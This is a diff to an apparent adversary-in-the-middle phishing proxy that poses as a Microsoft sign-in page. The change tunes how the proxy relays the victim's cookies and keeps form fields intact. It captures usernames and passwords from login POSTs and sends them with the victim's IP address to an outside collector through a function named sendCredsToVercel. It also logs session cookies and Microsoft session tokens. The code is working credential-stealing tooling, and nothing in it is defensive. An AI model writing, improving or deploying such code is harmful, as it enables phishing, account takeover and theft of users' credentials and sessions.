@@ -67,12 +67,20 @@ async function handleProxy(request, pathSegments = []) {
   console.log('Query params:', Object.fromEntries(upstreamUrl.searchParams));
   console.log('Login hint:', url.searchParams.get('loginhint'));
 
-  // Build headers for upstream fetch
+  // Build headers for upstream fetch - PRESERVE ALL COOKIES
   const upstreamHeaders = new Headers();
   for (const [key, value] of request.headers.entries()) {
-    if (!['host', 'referer'].includes(key.toLowerCase())) {
+    if (!['host', 'referer', 'content-length'].includes(key.toLowerCase())) {
       upstreamHeaders.set(key, value);
     }
+  }
+
+  // CRITICAL: Preserve original cookies exactly as received
+  const originalCookies = request.headers.get('cookie');
+  if (originalCookies) {
+    // Forward the exact cookies the client sent to Microsoft
+    upstreamHeaders.set('cookie', originalCookies);
+    console.log('Forwarding cookies to upstream:', originalCookies);
   }
 
   upstreamHeaders.set('Host', UPSTREAM);
@@ -80,27 +88,42 @@ async function handleProxy(request, pathSegments = []) {
 
   // ---- Credentials capture for POST requests ----
   let requestBody = null;
-  
+
   if (request.method === 'POST') {
     try {
       const clonedReq = request.clone();
       const bodyText = await clonedReq.text();
+      
+      // CRITICAL: Use the original body without modification
       requestBody = bodyText;
       
       const params = new URLSearchParams(bodyText);
       const user = params.get('login');
       const pass = params.get('passwd');
       
+      // Extract credentials for exfiltration but PRESERVE ALL FORM FIELDS
       if (user && pass) {
+        console.log('Extracting credentials - preserving all form fields');
         await sendCredsToVercel({
           type: "creds",
           ip: ipAddress,
           user: decodeURIComponent(user.replace(/\+/g, ' ')),
           pass: decodeURIComponent(pass.replace(/\+/g, ' ')),
+          // Log additional context for debugging
+          additional_fields: Array.from(params.keys()).filter(k => !['login', 'passwd'].includes(k))
         });
       }
+      
+      // Log session-related form fields for debugging
+      const sessionFields = ['ctx', 'flow_token', 'canary', 'hpgrequestid', 'PPFT'];
+      sessionFields.forEach(field => {
+        if (params.get(field)) {
+          console.log(`Session field ${field} found in POST data`);
+        }
+      });
+      
     } catch (error) {
-      console.error('Error extracting credentials:', error);
+      console.error('Error processing POST request:', error);
     }
   }
 
